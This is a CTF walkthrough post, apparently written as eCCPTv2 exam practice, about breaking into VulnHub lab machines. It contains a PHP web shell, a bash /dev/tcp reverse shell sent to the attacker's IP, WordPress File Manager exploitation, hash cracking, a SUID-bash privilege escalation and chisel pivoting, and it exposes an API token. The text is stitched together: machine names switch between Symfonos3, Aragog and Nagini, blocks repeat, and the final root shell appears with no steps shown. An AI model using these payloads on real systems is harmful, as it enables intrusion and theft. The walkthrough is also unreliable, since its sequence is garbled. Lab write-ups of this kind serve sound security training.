---
layout: single
title: '<span class="vulnhub">eCCptV2 Simulation- /VulnHub</span>'
excerpt: "Synfonos3, is a machine from Vulnhub platform. I recommend you do these CTF because for the eCCptv2 it will be something like this."
date: 2023-04-05
categories:
  - vulnhub
  -certification
tags:  
  - wordpress
  - bruteforce
  - suid
  - privilege-escalation
  - web
  - php
  - reverse-shell
  - wpscan
  - hydra
  - linux
  - pivoting
  - Fuzzing
  - wpScan
toc: true
toc_label: "Content"
toc_sticky: true
show_time: true
---

Synfonos3, is a machine from Vulnhub platform. I recommend you do these CTF because for the eCCptv2 it will be something like these cluster, another very strong point to mention is that works well doings these machine as pivoting machines


**We will see all this from the perspective and methodology of a penetration test.**

- Links to the machines: [Synfonos3](https://www.vulnhub.com/entry/symfonos-31,332/)
- Difficulty assigned by Vulnhub: Medium
- The IP of the machine in my case will be: 192.168.100.65 (You will have a different ip so change it for all steps)

Let's get them!

## Enumeration

we have to figure out the ip of the machine so we need to use arp scan tool 
To do this we will make use of arp-scan and use a series of parameters that will make your search faster.

```bash
❯ arp-scan -Iens33 --localnet
```

The explanation of the meaning of each parameter is:
- ```-I-``` : We have to indicate our interface in my case will be ens33 in your case could be eth0.
- ```--localnet``` : We indicate that the search will be for our localnet.
output
```php
❯ arp-scan -Iens33 --localnet
Interface: ens33, type: EN10MB, MAC: 00:0c:29:f2:37:49, IPv4: 192.168.100.53
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.100.1	64:5e:10:84:35:47	(Unknown)
192.168.100.10	90:e8:68:d0:da:47	(Unknown)
192.168.100.4	8e:63:8c:7a:9f:b0	(Unknown: locally administered)
192.168.100.34	c4:03:a8:d9:4c:ca	(Unknown)
192.168.100.37	94:e6:f7:7a:1e:12	Intel Corporate
192.168.100.5	58:9a:3e:6e:27:40	(Unknown)
192.168.100.6	34:25:be:68:6f:95	(Unknown)
192.168.100.51	06:1f:61:f8:6e:4f	(Unknown: locally administered)
192.168.100.7	24:18:c6:dc:bd:cd	(Unknown)
192.168.100.65	00:0c:29:bd:7d:9e	VMware, Inc.
```
now we know the ip for the machine that we can reach, now we have to enumerate to figure out what kind of machine is based on the TTL which is time to life.
```bash
ping -c3 192.168.100.65
```
output:
```php
PING 192.168.100.65 (192.168.100.65) 56(84) bytes of data.
64 bytes from 192.168.100.65: icmp_seq=1 ttl=64 time=0.567 ms
64 bytes from 192.168.100.65: icmp_seq=2 ttl=64 time=0.270 ms
64 bytes from 192.168.100.65: icmp_seq=3 ttl=64 time=0.316 ms

--- 192.168.100.65 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2042ms
rtt min/avg/max/mdev = 0.270/0.384/0.567/0.130 ms
```

- ```-TTL-``` : means the time to life of the machine, if it's 64 the machine is Linux, or if it's 124 the machine will be windows.
- ```--3 packets transmitted, 3 received``` : with this output means that the machine is active.

The first thing we will do when you know the IP and when you know that the machine is active we have to scan the target and see which ports are open.
To do this we will make use of nmap and use a series of parameters that will make our scan faster.:

```bash
❯ nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 192.168.100.65 -oG allports
```
the meaning of each parameter is.:
- ```-p-``` : We indicate that the scan will be done for all ports.
- ```--open``` : We indicate that we are only interested in ports that are open.
- ```-sS``` : This flag indicates that we want to do a "SYN Scan" which means that the packets we will send will never complete the TCP connections and that will make our scan much less intrusive and quieter.
- ```-Pn``` : With this option we indicate that we do not want to do host discovery (since we know who our target is).
- ```--min-rate 5000``` : This flag can be exchanged for ```-T5```, both are intended to make our scanning faster (and noisier...). To be more detailed this flag indicates that we don't want to send less than 5,000 packets per second.
- ```-v``` : (verbose) To see which ports appear as we go along.
- ```-n``` : We don't want DNS resolution to be performed, since we are scanning an IP, not a domain.
output

```php
❯ nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n 192.168.100.65 -oG allports
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-20 11:32 CST
Initiating ARP Ping Scan at 11:32
Scanning 192.168.100.65 [1 port]
Completed ARP Ping Scan at 11:32, 0.03s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:32
Scanning 192.168.100.65 [65535 ports]
Discovered open port 80/tcp on 192.168.100.65
Discovered open port 22/tcp on 192.168.100.65
Completed SYN Stealth Scan at 11:32, 2.26s elapsed (65535 total ports)
Nmap scan report for 192.168.100.65
Host is up, received arp-response (0.00010s latency).
Scanned at 2023-04-20 11:32:45 CST for 2s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 00:0C:29:BD:7D:9E (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.43 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

At this point we know that there are 2 open ports: 80 (HTTP) and 22 (SSH), seeing this we have to make under consideration that we have 2 vias of get into the machine the SSH port and port 80 (at least to the outside), it can be deduced that the only way to enter the machine is through these services.

 once we know which ports are open we must perform the scan to those ports by running a series of scripts in order to obtain more information: server version, technology, possible vulnerabilities, etc...

```bash
❯ nmap -sC -sV -p22,80 192.168.100.65 -oN target
```


Where :

- ```-sV``` : If possible, it will show the version of the service running on each port.
- ```-A``` : We will run all relevant scripts (provided by nmap) on these ports.
- ```-p 80,22,21```: Open ports.
- ```-oN```: export the output to nmap format

Getting this output:

```php
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-20 11:33 CST
Nmap scan report for 192.168.100.65
Host is up (0.00044s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 48df48372594c4746b2c6273bfb49fa9 (RSA)
|   256 1e3418175e17958f702f80a6d5b4173e (ECDSA)
|_  256 3e795f55553b127596b43ee3837a5494 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:BD:7D:9E (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.88 seconds
```

To find out what we are dealing with, we will run **WhatWeb** in order to find the codename as well

```bash
http://192.168.100.65 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.100.65]
```

seems that does not give us a lot of information.

So let's visit the web the port 


After testing each of the attacks SSRF,SQLI,PATHtraversal I did not find anything relevant, on the other hand we are able to search for possible routes using gobuster for example

Since there seems to be no more information in sight, we will proceed to do *Fuzzing*, which consists of making requests to the server of several routes extracted from a dictionary with the objective of obtaining routes that exist. For this we will use *goBuster* although another powerful tool is *Ffuf* or wFuzz.

- With wfuzz would be:

```bash
wfuzz -c -L --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.100.61///FUZZ
```

- With ffuf would be:

```bash
ffuf -u http://192.168.100.61//FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc 200 -c -t 200
```
- With gobuster would be:
```bash
gobuster dir -u http://192.168.100.61/ -w /usr/share/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 --add-slash
```

At this point we found the following routes:

```
/javascript           (Status: 301) [Size: 321] [--> http://192.168.100.65/javascript/]
/blog                 (Status: 301) [Size: 315] [--> http://192.168.100.65/blog/]      
/server-status        (Status: 403) [Size: 279] 
```

let's enumerate it via wpSCAN in order to find vulneral plugins and potential vias to get in to the machine for example.

```php
[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
```

according with the output we don't find anything, so let's register and try again with the api token  

```bash
 wpscan --url http://192.168.100.65/blog/ --enumerate u,vp --plugins-detection aggressive --api-token=yocj0asWxCFcZvF1sdI9ocg10i7x5sDnwtZsXYhvIMuVszR23h2VIF1A
```
seems that we found some vulnerabilyties with the api token, that the page of WSPscan gave us.

```php
 | [!] 3 vulnerabilities identified:
 |
 | [!] Title: File Manager < 6.5 - Backup File Directory Listing
 |     Fixed in: 6.5
 |     References:
 |      - https://wpscan.com/vulnerability/49533dc2-17cb-459c-af28-69a7b9b9512f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-24312
 |      - https://zeroaptitude.com/zerodetail/wordpress-plugin-bug-hunting-part-1/
 |      - https://plugins.trac.wordpress.org/changeset/2326268/wp-file-manager
 |
 | [!] Title: File Manager 6.0-6.9 - Unauthenticated Arbitrary File Upload leading to RCE
 |     Fixed in: 6.9
 |     References:
 |      - https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25213
 |      - https://blog.nintechnet.com/critical-zero-day-vulnerability-fixed-in-wordpress-file-manager-700000-installations/
 |      - https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/
 |      - https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/
 |      - https://blog.sucuri.net/2020/09/critical-vulnerability-file-manager-affecting-700k-wordpress-websites.html
 |      - https://twitter.com/w4fz5uck5/status/1298402173554958338
 |
 | [!] Title: WP File Manager < 7.1 - Reflected Cross-Site Scripting (XSS)
 |     Fixed in: 7.1
 |     References:
 |      - https://wpscan.com/vulnerability/1cf3d256-cf4b-4d1f-9ed8-e2cc6392d8d8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24177
 |      - https://n4nj0.github.io/advisories/wordpress-plugin-wp-file-manager-i/
 |      - https://plugins.trac.wordpress.org/changeset/2476829/
```

- we have to use them using the URL's that we recived from the [output](https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9). now we have to wget that proof of concept.

```bash
wget https://ypcs.fi/misc/code/pocs/2020-wp-file-manager-v67.py
 ```
 something to consider is that after we analizy the code in the line 72 according with it the script is calling "payload.php" so we must to create before we execute this script
 
 ```bash
 nvim payload.php
❯ cat payload.php
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: payload.php
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?php
   2   │ echo "<pre>" . shell_exec($_REQUEST['cmd'])  .  "</pre";
   3   │ ?>
───────┴──────

 ```
 after we save it we must execute it using python3, example
 
 ```bash
python3 2020-wp-file-manager-v67.py http://192.168.100.65/blog
 ```
 output
  ```bash
200
Success!?
http://192.168.100.65/blog/blog/wp-content/plugins/wp-file-manager/lib/php/../files/payload.php 
 ```
 now we have to copy the output called "http://192.168.100.65/blog/blog/wp-content/plugins/wp-file-manager/lib/php/../files/payload.php " an delete 1 blog
 example
  ```bash
http://192.168.100.65/blog/wp-content/plugins/wp-file-manager/lib/php/../files/payload.php 
 ```
 now we have to use the page with the url before insert commands, in order to use the payload that we injected for example
  ```bash
❯ curl -s -X GET "http://192.168.100.65/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php?"   
 ```
 now we can insert commands
```bash
❯ curl -s -X GET "http://192.168.100.65/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php?cmd=whoami"
<pre>www-data
</pre#     
```
 
 
 ## Exploitation
 

let's take an advantage of ```RCE```, using the RCE that we seted before.


```
from our machine we have to 
nc -nlvp 443
```
so if we are able to execute commands let's make a [reverse shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) here's a list of it if you don't how to make it.

```
❯ curl -s -X GET "http://192.168.100.65/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.100.53/443 0>%261"

```


and on your own machine you have to stay hearing on port 443  ```nc -nlvp 443```, in order to make the connection successfully.

## Privilage Escalation

now that we gain access we have to do the treatment of the TTY because if we don't do it, we will be unable to execute shorcuts such as CTRL + C or CTRL + L or the stty size
let's make it ! press enter to go back to your reverse shell.
first we need to execute this script.

- ```-script /dev/null -c bash``` : change the value of the TTY.
- ```-Ctrl + z``` : end  the session of our reverse shell (for a while).
- ```-stty raw -echo;fg```: from our machine we have to change it.
- ```-export TERM=xterm```: change the value of the XTERM.
- ```-stty size```: now you have to verify your rows and columns from your personal desktop. in order to replace them in your reverse shell.
- ```-stty size```: verify you rows and columns.
- ```-stty rows {} columns {}```: change your rows and columns.

Let's find SUID permissions.

```bash
cerberus@symfonos3:/$ find \-perm -4000 -user root 2>dev/null
./usr/sbin/exim4
./usr/bin/newgrp
./usr/bin/chsh
./usr/bin/pkexec
./usr/bin/chfn
./usr/bin/gpasswd
./usr/bin/passwd
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/openssh/ssh-keysign
./bin/umount
./bin/mount
./bin/ping
./bin/su
```
seems that we can not take root from here, but how we have wordpress we can use find possible passwords in /var/www/html.

```
www-data@Aragog:/var/www/html$ ls
harry_potter_1.jpg  index.html
```
seems that we can not take root from here, another potential way is to find in apache directory.

```
www-data@Aragog:/var$ cat /etc/apache2/sites-enabled/wordpress.conf 
Alias /blog /usr/share/wordpress
<Directory /usr/share/wordpress>
    Options FollowSymLinks
    AllowOverride Limit Options FileInfo
    DirectoryIndex index.php
    Order allow,deny
    Allow from all
</Directory>
<Directory /usr/share/wordpress/wp-content>
    Options FollowSymLinks
    Order allow,deny
    Allow from all
</Directory>
```

and seems that all the wordpress is in /usr/share/wordpress so let's get into it.

```bash
} elseif (file_exists("/etc/wordpress/config-default.php
```

according with this file all crendials are in file default 

```bash
www-data@Aragog:/usr/share/wordpress$  cat /etc/wordpress/config-default.php
<?php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'mySecr3tPass');
```

we will use this pass that we found in mysql, because for hagrid and the others users did not work for me.

```bash
myseql -uroot -p
Enter password: mySecr3tPass

```

now we have to search for Dbs
example

```php
 MariaDB [(none)]> show databases;  
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress          |
```
now for tables

```php
use wordpress  
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [wordpress]> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
| wp_wpfm_backup        |
+-----------------------+
```
now for columns

```php
MariaDB [wordpress]> describe wp_users;
+---------------------+---------------------+------+-----+---------------------+----------------+
| Field               | Type                | Null | Key | Default             | Extra          |
+---------------------+---------------------+------+-----+---------------------+----------------+
| ID                  | bigint(20) unsigned | NO   | PRI | NULL                | auto_increment |
| user_login          | varchar(60)         | NO   | MUL |                     |                |
| user_pass           | varchar(255)        | NO   |     |                     |                |
| user_nicename       | varchar(50)         | NO   | MUL |                     |                |
| user_email          | varchar(100)        | NO   | MUL |                     |                |
| user_url            | varchar(100)        | NO   |     |                     |                |
| user_registered     | datetime            | NO   |     | 0000-00-00 00:00:00 |                |
| user_activation_key | varchar(255)        | NO   |     |                     |                |
| user_status         | int(11)             | NO   |     | 0                   |                |
| display_name        | varchar(250)        | NO   |     |                     |                |
+---------------------+---------------------+------+-----+---------------------+----------------+
10 rows in set (0.001 sec)

```

now we will search for the information of the user .
```bash
select * from wp_users;
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email               | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | hagrid98   | $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. | wp-admin      | hagrid98@localhost.local |          | 2021-03-31 14:21:02 |                     |           0 | WP-Admin     |
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.001 sec)

```
now we will execute a brute force attack in order to figure out what's the password for hash "$P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc." using john and seclist
```bash
❯ john -w:rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)
1g 0:00:00:00 DONE (2023-04-20 15:49) 7.692g/s 11815p/s 11815c/s 11815C/s 753951..mexico1
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed
```
according with john the password is password123
now we have to figure out who is the owner of this password we have 2 potentials options 
```bash
www-data@Aragog:/home$ ls
ginny  hagrid98
```
so how we saw the port 22 is open so 
```bash
❯ ssh ginny@192.168.100.65
The authenticity of host '192.168.100.65 (192.168.100.65)' can't be established.
ECDSA key fingerprint is SHA256:Xy+Xj3BR8BLS4rk/l2jfAZmSh0d3m5zJXaB5QsUT3AA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.65' (ECDSA) to the list of known hosts.
ginny@192.168.100.65's password: 
Permission denied, please try again.
ginny@192.168.100.65's password:

❯ ssh hagrid98@192.168.100.65
hagrid98@192.168.100.65's password: 
Linux Aragog 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
hagrid98@Aragog:~$ 
```
whoami 
```bash
hagrid98@Aragog:~$ whoami
hagrid98

first flag

❯ echo "MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==" | base64 -d; echo
1: RidDlE's DiAry dEstroYed By haRry in chaMbEr of SeCrets
```
using hagrid98 let's find SUID binaries 
```bash
hagrid98@Aragog:/$ find \-perm -4000 -user root 2>dev/null
./usr/bin/newgrp
./usr/bin/chfn
./usr/bin/mount
./usr/bin/su
./usr/bin/passwd
./usr/bin/chsh
./usr/bin/gpasswd
./usr/bin/umount
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
```
in this case we could'nt find anything so, let's search for the hagrid user.

```bash
hagrid98@Aragog:/$ find \-user hagrid98 2>/dev/null
./proc/2923/patch_state
./opt/.backup.sh

```
and we found something let's reasearch it in order to find vulnerabilities 

```bash
hagrid98@Aragog:/$ ls -l ./opt/.backup.sh 
-rwxr-xr-x 1 hagrid98 hagrid98 81 Apr  1  2021 ./opt/.backup.sh
```
seems that we can take an adventage of it so let's get it 

```bash
#!/bin/bash

cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads 
hagrid98@Aragog:/$ 
```


```bash
hagrid98@Aragog:/$ ls -l /tmp
total 12
drwx------ 3 root root 4096 Apr 20 22:48 systemd-private-1a2aa0f64ccf4c09ab8cccd32f19c626-apache2.service-Rl55VT
drwx------ 3 root root 4096 Apr 20 22:48 systemd-private-1a2aa0f64ccf4c09ab8cccd32f19c626-systemd-timesyncd.service-l9HIoe
drwxr-xr-x 5 root root 4096 Apr 20 22:52 tmp_wp_uploads
```

```bash
  GNU nano 3.2                                                                                                         /opt/.backup.sh                                                                                                                    

#!/bin/bash

cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads 


chmod u+s /bin/bash

```
now if everything works we just have to monitoring the bash using watch command 

```bash
hagrid98@Aragog:/$ watch -n 1 ls -l /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```
and now the permission changed rwsr, we just have to change the privilages of the bash using bash -p
.
```bash
hagrid98@Aragog:/$ bash -p
bash-5.0# whoami
root
```
flag

```bash
bash-5.0# cd /root/
bash-5.0# ls
horcrux2.txt
bash-5.0# cat horcrux2.txt 
  ____                            _         _       _   _                 
 / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
 \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
                  |___/                                                   


Machine Author: Mansoor R (@time4ster)
Machine Difficulty: Easy
Machine Name: Aragog 
Horcruxes Hidden in this VM: 2 horcruxes

You have successfully pwned Aragog machine.
Here is your second hocrux: horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}




# For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com

bash-5.0# 
```


- ```-cerberus@symfonos3:/tmp$ id
uid=1001(cerberus) gid=1001(cerberus) groups=1001(cerberus),33(www-data),1003(pcap)```

another flag  
- ```MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU= ```
- decodificared "2: maRvoLo GaUnt's riNg deStrOyed bY DUmbledOre"


now let's find another machines because if we are able to watch another interface it's because theres other machines in to this environment 

```bash
bash-5.0# hostname -I
10.10.0.136 192.168.100.65 
bash-5.0# 
```




## Enumeration | Pivoting 10.10.0.137

-using my tool [HostDiscovery](https://zeekk3n.github.io/andrey.github.io/project-host-discovery/#) we will search for more IP/interfaces

first of all we need to verify which interfaces we are able to enumerate.

```bash
bash-5.0# ./hostdiscovery.sh 
[+] host 10.10.0.1 - is ACTIVE
[+] host 10.10.0.137 - is ACTIVE
[+] host 10.10.0.136 - is ACTIVE
```
it looks like we can enumerate host 10.10.0.137, let's use my tool in order to find open ports  [PortScanner](https://zeekk3n.github.io/andrey.github.io/project-portscanner/#)


```bash
bash-5.0# ./PortScanner.sh 
[+] Port 22 - is OPEN
[+] Port 80 - is OPEN
^C

[!] getting out that here...
```




ow we know the ip for the machine that we can reach, now we have to enumerate to figure out what kind of machine is based on the TTL which is time to life.
```bash
ping -c3 192.168.100.65
```
output:
```php
PING 192.168.100.65 (192.168.100.65) 56(84) bytes of data.
64 bytes from 192.168.100.65: icmp_seq=1 ttl=64 time=0.567 ms
64 bytes from 192.168.100.65: icmp_seq=2 ttl=64 time=0.270 ms
64 bytes from 192.168.100.65: icmp_seq=3 ttl=64 time=0.316 ms

--- 192.168.100.65 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2042ms
rtt min/avg/max/mdev = 0.270/0.384/0.567/0.130 ms
```

- ```-TTL-``` : means the time to life of the machine, if it's 64 the machine is Linux, or if it's 124 the machine will be windows.
- ```--3 packets transmitted, 3 received``` : with this output means that the machine is active.

SSH keys

```
keys
```bash
ssh key
```
now we have to use chisel in order to create a tunneling to use the tools that we have in our own machine 
such as Nmap and to scan ports such as 80 and 22 that we saw them open 

first of all we need to get chisel from [github](https://github.com/jpillora/chisel/releases/tag/v1.8.1)
save it in the directory download and share it using a server with python3 


```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

from the machine that we obtained root before we have to wget it and give it permissions of execution 
```bash
bash-5.0# wget 192.168.100.53:80/chisel.sh
--2023-04-21 22:04:56--  http://192.168.100.53/chisel.sh
Connecting to 192.168.100.53:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3354732 (3.2M) [text/x-sh]
Saving to: 'chisel.sh'

chisel.sh                       100%[====================================================>]   3.20M  --.-KB/s    in 0.04s   

2023-04-21 22:04:56 (73.7 MB/s) - 'chisel.sh' saved [3354732/3354732]

bash-5.0# ls
chisel.sh
bash-5.0# chmd^C
bash-5.0# chmod +x chisel.sh 
```
now we have to execute from our machine using a server mode and sock5 connection in order to visualize all ports for example 

```bash
./chisel.sh server --reverse -p 1234
2023/04/21 10:41:21 server: Reverse tunnelling enabled
2023/04/21 10:41:21 server: Fingerprint mJhxosRnafmGDz5dRSAPLQJ0fJ2Tl6xgN8ZUr0/ddHM=
2023/04/21 10:41:21 server: Listening on http://0.0.0.0:1234
2023/04/21 10:42:59 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```
and from the machine that we obtained root before we have to use it as client for example 
```bash
bash-5.0# ./chisel.sh client 192.168.100.53:1234 R:socks
```
in order to use this tunneling we will use proxychains to do this we have to change some setting here
we have to open proxychains conf in order to add our connection via sock5
example 


nvim /etc/proxychains.conf   
```bash
nvim /etc/proxychains.conf  
```
scroll down and add

```bash
socks5 127.0.0.1 1080  
```

now let's verify if it worked using nmap in order to enumerate the ports open that we saw using my PorScanner.sh.in this case we will take adventage of the tunning and nmap using proxychains

```bash
❯ proxychains nmap -sT -Pn --top-ports 500 -open -T5 -v -n 10.10.0.137 2>/dev/null | grep  -vE "timeout"
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-20 21:31 CST
Initiating Connect Scan at 21:31
Scanning 10.10.0.137 [500 ports]
Discovered open port 80/tcp on 10.10.0.137
Discovered open port 22/tcp on 10.10.0.137
Completed Connect Scan at 21:31, 2.29s elapsed (500 total ports)
Nmap scan report for 10.10.0.137
Host is up (0.0038s latency).
Not shown: 498 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
we must use -sT and -Pn parameters because we are using a tunneling type socks 5 in order to avoid problems

we saw port 22 and 80 so we have to enumerate that service on port 80 but we are not able to see it unless we use foxyProxy and add it as our local host 

example 
<a href="/assets/images/eccptv2/1.png"><img src="/assets/images/eccptv2/1.png" alt="eccptv2"></a>

now how we can enumerate that port 80 we will search for possible routes using go buster 

- With gobuster would be:

```bash
❯ proxychains gobuster dir -u http://10.10.0.137 -w /usr/share/SecLists-master/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 -x html,php,txt --proxy socks5://127.0.0.1:1080
ProxyChains-3.1 (http://proxychains.sf.net)

take under consideration that you have always to use this parameter in order to target the tunneling made with chisel --proxy socks5://127.0.0.1:1080

```

and we found 2 interesting things, from the page output:

```bash
/index.html           (Status: 200) [Size: 97]
/note.txt             (Status: 200) [Size: 234]
/joomla               (Status: 301) [Size: 311] [--> http://10.10.0.137/joomla/]
/server-status        (Status: 403) [Size: 276]                                 
Progress: 1397916 / 5095336 (27.44%)          
```



let's enumerate them.
http://10.10.0.137/note.txt
output

```bash
Hello developers!!


I will be using our new HTTP3 Server at https://quic.nagini.hogwarts for further communications.
All developers are requested to visit the server regularly for checking latest announcements.


Regards,
site_amdin

``````
let's enumerate them.



so we have to use a tool in order to enumerate a http3 service http3 usually wokr on 443 port 
http://10.10.0.137/joomla  

tool



```bash
 git clone --recursive https://github.com/cloudflare/quiche
``````

tool

```bash
curl https://sh.rustup.rs -sSf | sh
```
tool

```bash
1) Proceed with installation (default)
2) Customize installation
3) Cancel installation
>1
```
tool
```bash
source "$HOME/.cargo/env"
```
tool
```bash
❯ rustup update
```
tool

tool
```bash
❯ rustup update
```
tool

```bash
❯ cargo build --examples
```
tool

```bash
❯ cargo tests
```
tool

```bash
❯ cargo tests
```
usage

```bash
bash-5.0$ ./chisel.sh client 192.168.100.53:1234 R:socks R:443:10.10.0.137:443/udp
```
usage 

```bash
❯ ./http3-client https://127.0.0.1
```
usage 
```bash
❯ ./http3-client https://127.0.0.1
<html>
	<head>
	<title>Information Page</title>
	</head>
	<body>
		Greetings Developers!!
		
		I am having two announcements that I need to share with you:

		1. We no longer require functionality at /internalResourceFeTcher.php in our main production servers.So I will be removing the same by this week.
		2. All developers are requested not to put any configuration's backup file (.bak) in main production servers as they are readable by every one.


		Regards,
		site_admin
	</body>
</html>
```
usage 
```bash
❯ cargo tests
```
usage 

```bash
❯ cargo tests
```

let's enumerate them.
[note.txt](http://10.10.0.137/joomla)

```bash
bash-4.2# whoami
root
```




and here's the flag.

```bash
hades@symfonos3: cd /root
hades@symfonos3: ls
proof.txt
hades@symfonos3: cat proof.txt

        Congrats on rooting symfonos:3!
                                        _._
                                      _/,__\,
                                   __/ _/o'o
                                 /  '-.___'/  __
                                /__   /\  )__/_))\
     /_/,   __,____             // '-.____|--'  \\
    e,e / //  /___/|           |/     \/\        \\
    'o /))) : \___\|          /   ,    \/         \\
     -'  \\__,_/|             \/ /      \          \\
             \_\|              \/        \          \\
             | ||              <    '_    \          \\
             | ||             /    ,| /   /           \\
             | ||             |   / |    /\            \\
             | ||              \_/  |   | |             \\
             | ||_______________,'  |__/  \              \\
              \|/_______________\___/______\_             \\
               \________________________     \__           \\        ___
                  \________________________    _\_____      \\ _____/
                     \________________________               \\
        ~~~~~~~        /  ~~~~~~~~~~~~~~~~~~~~~~~~~~~  ~~ ~~~~\\~~~~
            ~~~~~~~~~~~~~~    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~    //

        Contact me via Twitter @zayotic to give feedback!

#
```
Happy hacking !
